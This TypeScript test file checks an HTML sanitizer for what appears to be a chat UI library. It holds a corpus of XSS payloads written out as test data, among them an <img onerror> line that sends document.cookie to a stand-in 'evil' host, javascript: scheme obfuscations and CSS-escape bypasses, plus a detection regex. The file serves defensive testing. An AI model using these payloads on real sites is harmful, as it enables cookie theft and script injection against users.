import { describe, it, expect, vi } from 'vitest';
import { defaultSanitizer as s } from '../sanitize';
import { AparteConfig } from '../aparte-config';

describe('defaultSanitizer', () => {
    describe('script & event-handler XSS', () => {
        it('drops <script> entirely (no text surfaced)', () => {
            expect(s('<script>alert(1)</script>')).toBe('');
            expect(s('before<script>alert(1)</script>after')).toBe('beforeafter');
        });

        it('strips inline event handlers but keeps the element', () => {
            const out = s('<img src="cat.png" onerror="alert(1)">');
            expect(out).toContain('<img');
            expect(out).toContain('src="cat.png"');
            expect(out).not.toContain('onerror');
            expect(out).not.toContain('alert');
        });

        it('strips onclick/onmouseover on any tag', () => {
            const out = s('<p onclick="steal()" onmouseover="x()">hi</p>');
            expect(out).toBe('<p>hi</p>');
        });

        it('neutralises the classic <img onerror> credential-theft payload', () => {
            const out = s(`<img src=x onerror="fetch('//evil?c='+document.cookie)">`);
            expect(out).not.toContain('onerror');
            expect(out).not.toContain('fetch');
        });
    });

    describe('dangerous URL schemes', () => {
        it('drops javascript: hrefs but keeps the link text', () => {
            const out = s('<a href="javascript:alert(1)">click</a>');
            expect(out).toContain('click');
            expect(out).not.toContain('javascript:');
            expect(out).not.toContain('href=');
        });

        it('rejects whitespace/case-obfuscated javascript: schemes', () => {
            for (const url of ['JAVASCRIPT:alert(1)', ' javascript:alert(1)', 'java\tscript:alert(1)', 'vbscript:msgbox(1)']) {
                const out = s(`<a href="${url}">x</a>`);
                expect(out.toLowerCase()).not.toContain('script:');
                expect(out).not.toContain('href=');
            }
        });

        it('keeps safe href schemes and relative/anchor URLs', () => {
            expect(s('<a href="https://example.com">x</a>')).toContain('href="https://example.com"');
            expect(s('<a href="mailto:a@b.com">x</a>')).toContain('href="mailto:a@b.com"');
            expect(s('<a href="/docs/page">x</a>')).toContain('href="/docs/page"');
            expect(s('<a href="#section">x</a>')).toContain('href="#section"');
        });

        it('allows data: URLs only for images, only for image media types', () => {
            const img = s('<img src="data:image/png;base64,iVBORw0KGgo=">');
            expect(img).toContain('src="data:image/png;base64,iVBORw0KGgo="');
            const html = s('<img src="data:text/html,<script>alert(1)</script>">');
            expect(html).not.toContain('data:text/html');
            expect(html).not.toContain('src=');
        });
    });

    describe('dangerous elements', () => {
        it('removes iframe/object/embed/form wholesale', () => {
            expect(s('<iframe src="//evil"></iframe>')).toBe('');
            expect(s('<object data="x"></object>')).toBe('');
            expect(s('<embed src="x">')).toBe('');
            expect(s('<form action="//evil"><input></form>')).toBe('');
        });

        it('removes svg/math (namespace-confusion vectors)', () => {
            expect(s('<svg onload="alert(1)"></svg>')).toBe('');
            expect(s('<svg><script>alert(1)</script></svg>')).toBe('');
        });

        it('unwraps unknown-but-benign tags, keeping sanitized children', () => {
            expect(s('<marquee>hello</marquee>')).toBe('hello');
            expect(s('<unknown><strong>hi</strong></unknown>')).toBe('<strong>hi</strong>');
        });
    });

    describe('legitimate content is preserved', () => {
        it('keeps common markdown HTML intact', () => {
            const md = '<h2>Title</h2><p>A <strong>bold</strong> <a href="https://x.com">link</a> and <code>x</code>.</p><ul><li>one</li></ul>';
            expect(s(md)).toBe(md);
        });

        it('preserves highlighter output (classes + inline style colours)', () => {
            const shiki = '<pre class="shiki" style="background-color:#0d1117"><code><span style="color:#ff7b72">const</span> x</code></pre>';
            const out = s(shiki);
            expect(out).toContain('class="shiki"');
            expect(out).toContain('style="background-color:#0d1117"');
            expect(out).toContain('style="color:#ff7b72"');
        });

        it('keeps inert data-* attributes (DOMPurify-default parity)', () => {
            const out = s('<p data-line="3" data-md="x">hi</p>');
            expect(out).toContain('data-line="3"');
            expect(out).toContain('data-md="x"');
        });

        it('keeps GFM task-list checkboxes', () => {
            const out = s('<li><input type="checkbox" checked disabled> done</li>');
            expect(out).toContain('<input');
            expect(out).toContain('type="checkbox"');
        });

        it('keeps a highlighter’s CUSTOM properties — dual-theme output is only those', () => {
            // Shiki's documented way to render for light and dark at once is
            // `defaultColor: false`, which emits no `color` at all: only
            // `--shiki-light` / `--shiki-dark`, and CSS picks. The allowlist had no
            // entry for a custom property, so every declaration was dropped and every
            // code block came out WHITE — the feature was unreachable, not unstyled.
            const out = s('<span style="--shiki-light:#D73A49;--shiki-dark:#F97583">const</span>');
            expect(out).toContain('--shiki-light:#D73A49');
            expect(out).toContain('--shiki-dark:#F97583');
        });

        it('but never one of OURS — core’s whole theme is custom properties', () => {
            // A custom property is inert until some CSS reads it, and core's entire
            // palette is read that way. So a model-authored block setting this would
            // repaint the chat around itself: not highlighting, defacement with our
            // own paint.
            const out = s('<span style="--aparte-primary:#f0f;--shiki-light:#111">x</span>');
            expect(out).not.toContain('--aparte-primary');
            expect(out).toContain('--shiki-light:#111');
        });

        it('and an ESCAPED spelling of our namespace does not get through', () => {
            /*
             * The audit's one security finding, and the asymmetry behind it.
             *
             * `SAFE_STYLE_PROPS.has(prop)` is an allowlist, so an escape defeats itself —
             * `col\6fr` is not in the set and the declaration dies. The custom-property
             * test is a DENYLIST ("anything but ours"), and an escape defeats a denylist
             * the other way: `--\61 parte-text` does not start with `--aparte-`, so it
             * passed, and the browser decodes the ident back to `--aparte-text`.
             *
             * The assertion is about OUR layer, not about how an engine decodes: no
             * backslash survives in a property name, so the namespace is unreachable
             * whatever the decoding turns out to be.
             */
            const out = s('<span style="--\\61 parte-text:#fff;--shiki-light:#111">x</span>');
            expect(out, 'an escaped --aparte-* must not survive').not.toContain('61 parte-text');
            expect(out).not.toContain('\\');
            // …and a legitimate neighbour in the same declaration list still does.
            expect(out).toContain('--shiki-light:#111');
        });

        it('and the value rules still apply to a custom property', () => {
            // Allowing the NAME does not relax the VALUE: the same scrubbing that
            // guards `color` guards this, unchanged.
            expect(s('<span style="--x:url(//evil)">a</span>')).not.toContain('--x');
            // A literal backslash in the SOURCE — the CSS escape the scrub refuses.
            // With one backslash it is a JS octal escape, which esbuild rejects
            // outright: the very escape this guards against is hard to spell.
            expect(s('<span style="--x:u\\72 l(//evil)">b</span>')).not.toContain('--x');
            expect(s('<span style="--x:expression(alert(1))">c</span>')).not.toContain('--x');
        });

        it('keeps allowlisted style props and drops the rest (expression, layout, url)', () => {
            // color survives (presentational); width:expression(...) is dropped
            // (not allowlisted + a legacy vector).
            const out = s('<p style="color:red;width:expression(alert(1))">x</p>');
            expect(out).toContain('color:red');
            expect(out).not.toContain('expression');
            expect(out).not.toContain('width');
        });

        it('drops layout/positioning styles (click-jacking overlay) even alongside a safe prop', () => {
            const out = s('<a href="https://x.com" style="color:blue;position:fixed;inset:0;z-index:99999">x</a>');
            expect(out).toContain('color:blue');
            expect(out).not.toMatch(/position|inset|z-index/);
        });

        it('drops id/name (DOM clobbering)', () => {
            const out = s('<a id="cfg" name="cfg" href="https://x.com">x</a>');
            expect(out).not.toContain('id=');
            expect(out).not.toContain('name=');
        });

        it('adds rel=noopener to target=_blank links (reverse-tabnabbing)', () => {
            const out = s('<a href="https://x.com" target="_blank">x</a>');
            expect(out).toContain('rel="noopener noreferrer"');
        });
    });

    it('returns empty/falsy input unchanged', () => {
        expect(s('')).toBe('');
    });
});

/**
 * XSS bypass corpus — obfuscation & mutation vectors. Each payload, once
 * sanitized, must contain none of these executable markers. Complements the
 * targeted cases above with the harder evasions a real attacker reaches for.
 */
describe('defaultSanitizer — XSS bypass corpus', () => {
    const FORBIDDEN = /\son[a-z]+\s*=|javascript:|vbscript:|<script|<svg|<iframe|<object|<embed|<form|<math|<applet|expression\s*\(|formaction/i;
    const PAYLOADS = [
        // event handlers — quoting / spacing / casing
        '<img src=x onerror=alert(1)>',
        '<img src=x OnErRoR=alert(1)>',
        '<img src="x" onerror = "alert(1)">',
        '<div onmouseover="alert(1)">hi</div>',
        '<a href="#" onclick=alert(1)>x</a>',
        '<a title="x"onmouseover="alert(1)">x</a>',
        // scheme obfuscation
        '<a href="javascript:alert(1)">x</a>',
        '<a href="  javascript:alert(1)">x</a>',
        '<a href="java\tscript:alert(1)">x</a>',
        '<a href="java\nscript:alert(1)">x</a>',
        '<a href="JaVaScRiPt:alert(1)">x</a>',
        '<a href="vbscript:msgbox(1)">x</a>',
        '<a href="&#106;avascript:alert(1)">x</a>',
        '<a href="data:text/html,<script>alert(1)</script>">x</a>',
        // dangerous elements (dropped wholesale, incl. mXSS foreign content)
        '<script>alert(1)</script>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<<script>alert(1)</script>',
        '<svg onload=alert(1)></svg>',
        '<svg><script>alert(1)</script></svg>',
        '<math><mtext><script>alert(1)</script></mtext></math>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="javascript:alert(1)"></object>',
        '<form action="x"><button formaction="javascript:alert(1)">x</button></form>',
        // style + srcset vectors
        '<div style="background:url(javascript:alert(1))">x</div>',
        '<div style="width:expression(alert(1))">x</div>',
        '<img srcset="x javascript:alert(1)">',
        // malformed / mutation
        '<img src=x onerror=alert(1)//',
        '<p><script>alert(1)</script>ok</p>',
    ];
    for (const payload of PAYLOADS) {
        it(`neutralizes ${JSON.stringify(payload).slice(0, 56)}`, () => {
            expect(s(payload)).not.toMatch(FORBIDDEN);
        });
    }
});


describe('defaultSanitizer — bypasses found by the cold audit', () => {
    // A CSS identifier escape is a legal spelling of any character, so `url(` can
    // be written without the letters the guard looks for. Composed from a char
    // code rather than written literally, to keep it exact through any layer that
    // rewrites backslashes.
    const BS = String.fromCharCode(92);

    it('strips a url() written with CSS identifier escapes', () => {
        const payload = `<p style="background-color:u${BS}72 l(//evil)">x</p>`;
        expect(s(payload)).not.toMatch(/u.?72 ?l|url/i);
    });

    it('still keeps a plain safe declaration next to it', () => {
        expect(s('<p style="color:red">x</p>')).toContain('color:red');
    });

    it('rejects a data: image URL with no media type', () => {
        // The subtype group used to be optional, so these carried no type at all.
        for (const bad of ['data:image/,x', 'data:image/;base64,AAA']) {
            const out = s(`<img src="${bad}">`);
            expect(out, `${bad} should not survive`).not.toContain('data:image');
        }
    });

    it('still allows the named image subtypes, svg+xml included', () => {
        for (const ok of ['data:image/png;base64,AAA', 'data:image/svg+xml,%3Csvg%3E']) {
            expect(s(`<img src="${ok}">`), `${ok} should survive`).toContain('data:image');
        }
    });
});


describe('aparteGlobalConfig.setHtmlSanitizer(null)', () => {
    it('warns, because turning every renderer into a raw innerHTML sink should not be silent', () => {
        const cfg = new AparteConfig();
        const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
        try {
            cfg.setHtmlSanitizer(null);
            expect(warn).toHaveBeenCalledTimes(1);
            expect(String(warn.mock.calls[0]?.[0])).toContain('DISABLED');
            expect(cfg.sanitizeHtml('<img onerror=x>')).toBe('<img onerror=x>');
        } finally {
            warn.mockRestore();
        }
    });

    it('does not warn when a real sanitizer is installed', () => {
        const cfg = new AparteConfig();
        const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
        try {
            cfg.setHtmlSanitizer(html => html.replace(/</g, '&lt;'));
            expect(warn).not.toHaveBeenCalled();
        } finally {
            warn.mockRestore();
        }
    });
});

describe('defaultSanitizer — srcset follows the same URL allowlist as src', () => {
    // Found by an audit: `srcset` had only a `javascript:|vbscript:` substring
    // test, so the allowlist gave two different answers for one URL depending on
    // which attribute carried it.
    const attr = (html: string): string | null => {
        const d = document.createElement('div');
        d.innerHTML = s(html);
        return d.querySelector('img, source')?.getAttribute('srcset') ?? null;
    };

    it('rejects a smuggled data:text/html candidate', () => {
        expect(attr('<img srcset="data:text/html,<script>alert(1)</script> 1x">')).toBeNull();
    });

    it('still rejects javascript:', () => {
        expect(attr('<img srcset="javascript:alert(1) 1x">')).toBeNull();
    });

    it('keeps a legitimate data:image candidate, comma and all', () => {
        // The reason this is scheme-scanned rather than comma-split: a base64
        // data URL contains a comma, so splitting candidates would break it.
        expect(attr('<img srcset="data:image/png;base64,iVBORw0KGgo= 2x, small.png 1x">'))
            .toContain('data:image/png;base64');
    });

    it('keeps relative and https candidates', () => {
        expect(attr('<img srcset="a.png 1x, b.png 2x">')).toBe('a.png 1x, b.png 2x');
        expect(attr('<img srcset="https://cdn.example/a.png 1x">')).toContain('https://');
    });

    it('allows data:image on <source> too — inside a <picture> it feeds an <img>', () => {
        expect(attr('<picture><source srcset="data:image/webp;base64,AAA 1x"></picture>'))
            .toContain('data:image/webp');
    });
});
